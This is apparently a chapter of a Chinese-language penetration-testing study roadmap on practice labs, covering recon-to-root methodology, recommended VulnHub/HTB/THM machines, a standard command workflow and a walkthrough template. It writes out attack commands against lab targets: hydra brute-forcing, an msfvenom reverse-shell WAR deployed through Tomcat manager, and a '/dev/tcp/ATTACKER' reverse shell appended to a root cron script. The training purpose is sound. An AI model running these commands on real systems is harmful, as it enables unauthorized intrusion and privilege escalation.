# 第 5 章 · 实战化与持续输出

> 对应路线：**阶段 5**（持续进行）
> 前置要求：完成第 1–4 章
> 本章目标：把学到的技能串成完整渗透链；形成可展示的作品集（walkthrough）

---

## 0. 这一章为什么最重要

前面四章是"学零件"，这一章是"组装并开上路"。

**残酷的事实**：做过 100 台靶机但没写笔记的人，面试时讲不出攻防逻辑；
认真做 20 台并写下 walkthrough 的人，能画出完整攻击链、说出每一步为什么。
**输出 = 真正学会。**

---

## 0.5 先建立"渗透思维"（比工具更重要）

**初学者最大的误区**：以为渗透 = 会一堆工具。

**真相**：工具只是手段。真正决定水平的是**思维方式**。

### 0.5.1 渗透的五阶段方法论

```
① 信息收集（Recon）
   ↓  "我面对的是什么系统？有哪些入口？"
② 漏洞发现（Vulnerability Discovery）
   ↓  "这些入口里，哪些可能有缺陷？"
③ 漏洞利用（Exploitation）
   ↓  "怎么把缺陷变成实际访问权限？"
④ 后渗透（Post-Exploitation）
   ↓  "我在机器上能做什么？怎么扩大战果？"
⑤ 报告（Reporting）
      "我发现了什么？风险多大？怎么修？"
```

**关键认知：① 占 60% 时间。**

新手常犯的错：一扫到端口就急着找 exp。老手会花大量时间**穷尽信息**：

- 每个端口版本号是什么？有没有已知漏洞？
- Web 站点的每个参数、每个页面、每个 JS 文件都看了吗？
- 有没有隐藏目录、备份文件、注释里的线索？
- 用户名规律是什么？（`alice`, `bob`, `carol`... 还是 `zhang.wei`?）

**为什么信息收集这么重要？**

因为**漏洞就在信息里**。不收集信息，就像闭着眼找钥匙。

### 0.5.2 遇到问题时的思考框架

```
卡住了？按这个顺序思考：

1. 我漏了什么信息？
   → 端口只扫了常见的吗？目录爆破用了好字典吗？
   → 页面源码、JS、注释、robots.txt、sitemap 都看了吗？

2. 这个服务的"标准攻击面"是什么？
   → 例如：看到 SMB 想共享/匿名/弱口令；看到 Web 想注入/上传/越权
   → 查 HackTricks 对应章节，看别人的攻击清单

3. 有没有"低垂的果实"？
   → 弱口令、默认凭据、已知 CVE、未授权访问

4. 我是不是太快跳到"利用"了？
   → 回到第 1 步，把信息收集做扎实

5. 换个角度：如果我是管理员，会怎么配这个系统？
   → 这个视角常常能发现配置错误
```

**"枚举为王"（Enumeration is key）** —— 这是渗透界的第一信条。

### 0.5.3 常见的思维陷阱

| 陷阱 | 表现 | 纠正 |
|---|---|---|
| **隧道视野** | 死磕一个漏洞点不放 | 卡 40 分钟就换方向，记下来回头再看 |
| **跳步** | 跳过枚举直接搜 exp | 枚举做扎实，exp 自然浮现 |
| **只信工具** | 全靠自动化扫描器 | 手工测试才能发现逻辑漏洞 |
| **忽略"无聊"的线索** | 觉得注释、版本号没用 | 版本号直接对应 CVE；注释常有凭据 |
| **不复盘** | 做完就走 | 每台机器都要写"卡在哪、学到啥" |

---

## 0.6 一条完整的"思路演示"（以一台假想靶机为例）

**假设**：你对 `10.10.10.5` 一无所知。

**第 1 步：信息收集**

```bash
# 全端口扫描（不要只扫常见端口！）
nmap -Pn -n -p- --min-rate 2000 -T4 10.10.10.5
# 结果：22 (ssh), 80 (http), 8080 (http-proxy)

# 详细扫描
nmap -Pn -sV -sC -p 22,80,8080 10.10.10.5
# 结果：Apache 2.4.41 / OpenSSH 8.2p1
```

**思考**：Apache 2.4.41 —— 不算老，直接找 CVE 意义不大。重点看 80 和 8080。

```bash
# Web 指纹
whatweb http://10.10.10.5
whatweb http://10.10.10.5:8080
# 80: 一个静态官网
# 8080: "Apache Tomcat" ← 重点！
```

**思考**：Tomcat 有经典攻击面 —— `/manager` 管理面板、弱口令、CVE。

```bash
# 目录爆破
gobuster dir -u http://10.10.10.5:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt
# 发现：/manager/html (401), /docs, /examples
```

**第 2 步：漏洞发现**

```bash
# /manager/html 需要认证 → 试默认凭据
curl -u tomcat:tomcat http://10.10.10.5:8080/manager/html
curl -u admin:admin   http://10.10.10.5:8080/manager/html
# 失败 → 试弱口令爆破
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
      10.10.10.5 -s 8080 http-get /manager/html
# 成功：tomcat:s3cret
```

**第 3 步：漏洞利用**

Tomcat manager 能部署 WAR 包 → **直接 getshell**。

```bash
# 生成恶意 WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war > shell.war

# 上传
curl -u tomcat:s3cret \
  "http://10.10.10.5:8080/manager/text/deploy?path=/shell" \
  --upload-file shell.war

# 监听 + 触发
nc -lvnp 4444
curl http://10.10.10.5:8080/shell/
```

**第 4 步：后渗透**

```bash
# 拿到 shell（tomcat 用户）
whoami; id; uname -a
# 枚举提权
sudo -l                          # 看 sudo 权限
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
# 假设发现：tomcat 对某个 root 脚本有写权限 → 提权
```

**第 5 步：写报告**

记录攻击链、每个决策点为什么这么选、卡在哪、学到了什么。

---

## 1. 靶机资源总览（全部免费）

| 平台 | 数量 | 特点 | 地址 |
|---|---|---|---|
| **VulnHub** | 数百 | 下载 OVA 本地跑，完全离线 | https://www.vulnhub.com |
| **HackMyVM** | 300+ VM | 类 HTB，无需账号，含 AD 机 | https://hackmyvm.eu |
| **HTB** | 每周 2 台免费 | 质量高，有官方评分 | https://www.hackthebox.com |
| **THM** | 数百免费房间 | 有引导，适合入门 | https://tryhackme.com |
| **VulnHub** 镜像站 | — | 国内可用的加速镜像 | 见下方 |

> HackMyVM 明确说明：**只玩 VM 不需要账号**。

---

## 2. 入门靶机推荐清单（按难度）

### 2.1 第 1 梯队：零基础热身（各 1–2 小时）

VulnHub 上的经典入门机（已核实真实存在）：

| 靶机 | 难度 | 关键点 | 完成 |
|---|---|---|---|
| **Jangow: 1.0.1** | Easy | 枚举为王、命令注入 | ☐ |
| **The Planets: Earth** | Easy | Web + 提权 | ☐ |
| **ICA: 1** | Easy | 弱口令 + 数据库提权 | ☐ |
| **Noob: 1** | Easy | 综合入门 | ☐ |
| **Matrix-Breakout 2: Morpheus** | Easy | Web 渗透 | ☐ |
| **Napping: 1.0.1** | Easy | 命令注入 + 提权 | ☐ |
| **Red: 1** | Easy | 恢复被控系统 | ☐ |
| **Thales: 1** | Easy | Tomcat 攻击 | ☐ |
| **Empire: Breakout** | Easy | 综合入门 | ☐ |
| **Empire: LupinOne** | Easy | 信息收集 | ☐ |

**HTB Starting Point**（免费，有引导）：Meow → Fawn → Dancing → Redeemer → Explosion → Preignition → Mongod → Synced → Appointment → Sequel

### 2.2 第 2 梯队：Web 专项（各 2–4 小时）

| 靶机 | 关键技能 |
|---|---|
| VulnHub `Web Machine: N7` | Web 综合 |
| THM `Vulnversity` | 文件上传 + 提权 |
| THM `OWASP Juice Shop` | 现代 Web 漏洞 |
| THM `Pickle Rick` | 基础 Web |
| THM `Ignite` | CMS 攻击 |

### 2.3 第 3 梯队：系统提权专项

| 靶机 | 平台 | 关键技能 |
|---|---|---|
| THM `Blue` | THM | MS17-010 永恒之蓝 |
| THM `Kenobi` | THM | Samba + 提权 |
| THM `Steel Mountain` | THM | 服务提权 |
| THM `Alfred` | THM | Jenkins |
| THM `HackPark` | THM | CMS + 提权 |
| VulnHub `Digitalworld.local: Electrical` | VulnHub | 内网 |

### 2.4 第 4 梯队：AD / 内网

| 靶机 | 平台 | 关键技能 |
|---|---|---|
| THM `Attacktive Directory` | THM | AD 入门 |
| THM `Attacking Kerberos` | THM | Kerberos |
| HackMyVM AD 系列 | HackMyVM | 域环境 |
| HTB 退役 AD 机器 | HTB | 综合内网 |

---

## 3. VulnHub 靶机使用方法（详细）

### 3.1 下载与导入

```bash
# 1. 浏览器打开 https://www.vulnhub.com/
# 2. 找到目标机器 → Download → 下载 .ova 文件
# 3. 导入 UTM：
#    UTM → 新建 → 虚拟化 → 从 OVA 导入 → 选文件
# 4. 网络模式设为 "Emulated VLAN" 或 "共享网络"
#    确保你的 Kali 容器能访问到它
```

### 3.2 找到靶机 IP

```bash
# 方法 1：UVM 界面直接看
# 方法 2：nmap 扫描网段
nmap -sn 192.168.64.0/24
# 方法 3：arp-scan
arp-scan -l
```

> **注意**：VulnHub 靶机多为 **x86_64**；M4 Mac 上 UTM 可软件模拟 x86，
> 但速度较慢。优先选有 ARM 版本或使用 QEMU 模拟，或直接用在线平台（THM/HTB/HackMyVM）。

---

## 4. 标准渗透流程（每台靶机都照这个走）

### 4.1 五阶段法

```
① 信息收集  →  ② 立足点  →  ③ 提权  →  ④ 横向（如有）  →  ⑤ 写报告
   Recon         Foothold      PrivEsc     Lateral Move      Report
```

### 4.2 详细命令流程

```bash
# ===== 准备 =====
TARGET=<靶机IP>
mkdir -p ~/loot/$TARGET && cd ~/loot/$TARGET
export TARGET

# ===== ① 信息收集 =====
# 全端口快速扫描
nmap -Pn -n -p- --min-rate 2000 -T4 $TARGET > 01-allports.txt 2>&1

# 对开放端口做详细扫描
PORTS=$(grep -oE '^[0-9]+/tcp +open' 01-allports.txt | cut -d/ -f1 | paste -sd, -)
nmap -Pn -n -sV -sC -p $PORTS $TARGET > 02-detail.txt 2>&1

# Web 服务（如果有）
whatweb http://$TARGET > 03-whatweb.txt 2>&1
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt \
         -t 50 > 04-dirs.txt 2>&1

# 其他服务
enum4linux-ng -A $TARGET > 05-enum4linux.txt 2>&1   # SMB
```

```bash
# ===== ② 立足点 =====
# 根据收集的信息选择攻击面：
# - Web 漏洞（SQLi/RCE/文件上传）→ 第 2 章技能
# - 弱口令 → hydra / nxc
# - 已知服务漏洞 → searchsploit / nuclei

searchsploit <服务名 版本>
nuclei -u http://$TARGET -severity critical,high

# 拿到初始 shell 后
python3 -c 'import pty; pty.spawn("/bin/bash")'   # 升级为交互式 shell
export TERM=xterm
```

```bash
# ===== ③ 提权 =====
# Linux 提权枚举
./linpeas.sh > linpeas.txt 2>&1       # 下载：https://github.com/peass-ng/PEASS-ng
sudo -l                                 # 看 sudo 权限
find / -perm -4000 -type f 2>/dev/null  # SUID
cat /etc/crontab                        # 定时任务
uname -a                                # 内核版本 → searchsploit

# Windows 提权枚举
./winPEASx64.exe > winpeas.txt
whoami /priv                            # 看特权
systeminfo                              # 系统信息
```

```bash
# ===== ④ 横向（多机环境）=====
nxc smb <subnet>/24 -u <user> -p <pass>
proxychains4 <工具>                     # 过隧道打内网
```

### 4.3 常用一键工具

```bash
# 提权枚举
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

# Linux 提权检查
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

# 自动化信息收集
nuclei -u http://$TARGET
```

---

## 5. Walkthrough 模板（核心产出）

**每台靶机必须写一篇。** 下面是标准模板：

```markdown
# <靶机名> · <平台> · <难度>

> 日期：YYYY-MM-DD
> 目标 IP：x.x.x.x
> 耗时：X 小时

## 摘要
一句话说明这台机器的核心考点，例如：
"通过 Web 目录枚举发现备份文件泄露数据库凭据，SSH 登录后利用 SUID 二进制提权至 root。"

## 攻击链总览
```
nmap 发现 22/80
  → gobuster 发现 /backup
  → 下载 db.sql 拿到密码
  → SSH 登录 www-data
  → pspy 发现 root 定时任务
  → 修改脚本 → root
```

## 1. 信息收集

### 1.1 端口扫描
```bash
nmap -Pn -n -p- --min-rate 2000 -T4 10.10.10.5
```
结果：
```
22/tcp  open  ssh     OpenSSH 8.2p1
80/tcp  open  http    Apache httpd 2.4.41
```

### 1.2 Web 枚举
```bash
gobuster dir -u http://10.10.10.5 -w common.txt
```
发现：`/backup`（200）

## 2. 立足点

访问 `/backup` 发现 `db.sql`：
```bash
curl http://10.10.10.5/backup/db.sql
```
返回数据库转储，含凭据 `webuser:S3cr3t!`。

SSH 登录：
```bash
ssh webuser@10.10.10.5
# 成功，拿到 user.txt
```

## 3. 提权

上传 pspy 观察进程：
```bash
wget http://ATTACKER/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64 && /tmp/pspy64
```
发现 root 每 2 分钟执行 `/opt/scripts/backup.sh`，该文件可写。

写入反弹 shell：
```bash
echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /opt/scripts/backup.sh
# 攻击机监听
nc -lvnp 4444
```
拿到 root。

## 4. 战利品
- user.txt: `xxxxxxxx`
- root.txt: `xxxxxxxx`

## 5. 复盘

**做得好的**：
- 目录爆破字典选得准，快速找到 /backup

**卡住的**：
- 提权时忽略了 crontab，浪费 40 分钟
- 教训：拿到 shell 立刻跑 linpeas + pspy

**下次怎么更快**：
- 起手就 `nmap -p-`，别偷懒只扫常见端口
- 拿到 shell 第一件事跑提权枚举脚本

## 6. 参考技能点
- [ ] 目录爆破 → 第 2 章
- [ ] SUID 提权 → 第 1 章
- [ ] 定时任务提权 → 第 1 章
```

---

## 6. 持续输出计划

| 频率 | 动作 | 产出 |
|---|---|---|
| 每周 | 打 1–2 台靶机 | 2 篇 walkthrough |
| 每周 | 复现 1 个新 CVE（vulhub） | 1 篇分析笔记 |
| 每月 | 参加 1 场 CTF | 解题报告 |
| 每月 | 写 1 篇技术文章 | 发到博客/社区 |
| 每季 | 复盘技能矩阵 | 更新学习计划 |

### 6.1 技能矩阵自评（每季度更新）

| 领域 | 入门 | 熟练 | 精通 | 证据 |
|---|---|---|---|---|
| Web 渗透 | ☐ | ☐ | ☐ | PortSwigger 完成度 |
| Linux 提权 | ☐ | ☐ | ☐ | 靶机数量 |
| Windows 提权 | ☐ | ☐ | ☐ | |
| AD / 内网 | ☐ | ☐ | ☐ | |
| Pwn / 逆向 | ☐ | ☐ | ☐ | ROP Emporium 完成度 |
| 免杀 / 规避 | ☐ | ☐ | ☐ | |

### 6.2 作品集建设

把 walkthrough 整理成：

```
作品集/
├── README.md              # 索引 + 技能矩阵
├── vulnhub/
│   ├── jangow.md
│   ├── earth.md
│   └── ...
├── htb/
├── hackmyvm/
├── cve/
│   └── CVE-2021-44228-log4shell.md
└── ctf/
```

> 面试时，20 篇高质量 walkthrough 比任何证书都有说服力。

---

## 7. 免费 CTF 比赛

| 平台 | 说明 |
|---|---|
| CTFtime | 全球 CTF 赛历 https://ctftime.org |
| picoCTF | 永久题库，适合入门 |
| HackTheBox CTF | 定期举办 |
| 国内：DASCTF | https://ctf2.dasctf.com |
| 国内：CTFHub | https://www.ctfhub.com |

---

## 8. 自测清单

- [ ] 能独立完成一台 Easy 靶机的完整渗透链
- [ ] 能画出攻击链流程图
- [ ] 会写结构化 walkthrough
- [ ] 完成 10 台以上靶机并全部留档
- [ ] 靶机笔记积累到 20 篇
- [ ] 参加过至少 1 场 CTF
- [ ] 有 1 篇以上技术文章
- [ ] 建立了自己的作品集仓库

---

## 9. 长期成长路线（毕业后）

| 方向 | 下一步 |
|---|---|
| **渗透测试工程师** | OSCP / 内网深度 / 报告写作 |
| **红队** | C2 开发 / 免杀 / 社工 |
| **漏洞研究** | 逆向 / 模糊测试 / 0day |
| **安全开发** | 工具开发 / 自动化 |
| **蓝队 / DFIR** | 取证 / 威胁狩猎 |

**推荐进阶认证**（可选，不必须）：
- OSCP（渗透，含金量最高）
- CRTO（红队）
- OSWE（Web 专项）

---

## 10. 全路线回顾

```
第 1 章  Linux + 网络      →  能操作，能理解协议
第 2 章  Web 渗透 ★        →  能打 Web，会 30 类漏洞
第 3 章  Pwn / 逆向        →  懂二进制，会写 exploit
第 4 章  内网 / AD         →  能横向，能拿域控
第 5 章  实战 / 输出       →  能独立完成，能展示
```

**从今天开始，每周打一台机器，写一篇 walkthrough。一年后你就是另一个人。**

---

*本章文档位于 `runs/cyber-roadmap/docs/05-practice-and-output.md`*
